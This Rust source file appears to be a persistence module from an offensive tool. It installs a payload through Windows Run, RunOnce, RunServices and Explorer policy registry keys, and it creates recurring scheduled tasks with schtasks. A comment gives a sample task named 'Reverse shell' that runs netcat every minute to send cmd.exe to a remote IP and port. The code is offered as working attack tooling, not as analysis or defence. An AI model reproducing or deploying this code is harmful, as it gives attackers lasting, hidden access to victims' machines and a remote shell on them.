/*
    All the persistance tools
 */
use super::tools;
use winreg::enums::{HKEY_LOCAL_MACHINE,HKEY_CURRENT_USER};


/* Registry write */
fn set_key_local_or_user(path: &str, key: &str,value: &str) -> bool{
    if tools::set_reg_str(HKEY_LOCAL_MACHINE,path,key,value){
        return true
    }
    if tools::set_reg_str(HKEY_CURRENT_USER,path,key,value){
        return true
    }
    return false
}
pub enum CurrentVersionKey { Run, RunOnce, RunOnceEx , RunServices, RunServicesOnce, Explorer}

pub struct Registry {
    name: String,
    value: String,
}

impl Registry {
    pub fn new(key_name:&str,key_value:&str) -> Self {
        Self {name: key_name.to_string(), value: key_value.to_string()}
    }

    pub fn set_run_key(&self,root: CurrentVersionKey) -> bool{
        let root = match root{
            CurrentVersionKey::Run =>  r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            CurrentVersionKey::RunOnce =>  r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
            CurrentVersionKey::RunOnceEx =>  r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001",
            CurrentVersionKey::RunServices =>  r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices",
            CurrentVersionKey::RunServicesOnce =>  r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce",
            CurrentVersionKey::Explorer =>  r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run",
        };
        set_key_local_or_user(root,&self.name,&self.value)
    }
}



/*
    Tash Shuduler
 */
pub enum Scheduletype {MINUTE, HOURLY,DAILY,WEEKLY,MONTHLY,ONCE,ONSTART,ONLOGON,ONIDLE}

impl std::fmt::Display for Scheduletype {
    fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
        match self {
            Scheduletype::MINUTE => write!(f, "MINUTE"),
            Scheduletype::HOURLY => write!(f, "HOURLY"),
            Scheduletype::DAILY => write!(f, "DAILY"),
            Scheduletype::WEEKLY => write!(f, "WEEKLY"),
            Scheduletype::MONTHLY => write!(f, "MONTHLY"),
            Scheduletype::ONCE => write!(f, "ONCE"),
            Scheduletype::ONSTART => write!(f, "ONSTART"),
            Scheduletype::ONLOGON => write!(f, "ONLOGON"),
            Scheduletype::ONIDLE => write!(f, "ONIDLE"),
        }
    }
}

pub struct ScheduledTasks {
    payload: String,
    timer: Scheduletype,
    every: i8,
    description: String,
}


impl ScheduledTasks {
    pub fn new(payload: String, timer: Scheduletype, every:i8, description: String) -> Self {
        Self { payload, timer,every, description} 
    }
      
 
    /// .
    pub fn add_schtasks (&self) {
        let cmd = format!("/create /sc {} /mo {} /tn \"{}\" /tr '{}'",
                                    self.timer.to_string(),
                                    self.every.to_string(),
                                    self.description,
                                    self.payload);
        tools::run_exe("schtasks",&cmd,None);
       // schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr 'c:\Users\User\Downloads/nc.exe 192.168.56.103 1337 -e cmd.exe'
    }

    pub fn powershell(&self) {
        /* to do :) */
    }
}
